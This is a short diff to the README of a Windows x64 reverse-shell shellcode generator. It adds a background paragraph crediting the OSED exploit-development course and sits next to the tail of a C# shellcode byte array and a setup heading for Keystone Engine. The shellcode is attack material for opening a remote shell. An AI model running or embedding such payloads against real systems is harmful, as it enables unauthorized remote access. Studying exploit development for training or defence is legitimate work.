@@ -49,9 +49,8 @@ byte[] shellcode = new byte[503] {
 0x14,0xff,0xec,0x81,0x2d,0xa8,0x7f,0x6c,0x0d,0x0d,0x78,0x0b,0x58,0xf4,0x85,
 0xa2,0xc4,0x80,0xc2,0x61,0x58,0xad,0xc4 };
 ```
-
-
 ## Background
+I acquired my skills in x86 shellcode development through the `Offensive Security Exploit Developer` (OSED) course, which I found particularly captivating. Prior to the course, shellcode development seemed like a mysterious field to me, but I quickly realized how much flexibility it offers for achieving specific objectives. Recognizing that x64 shellcoding is more relevant and widely used in today's landscape, I've applied what I've learned to develop this dynamic and convenient Windows x64 reverse shell shellcode generator script.
 
 ## How to Use
 ### Install Keystone Engine
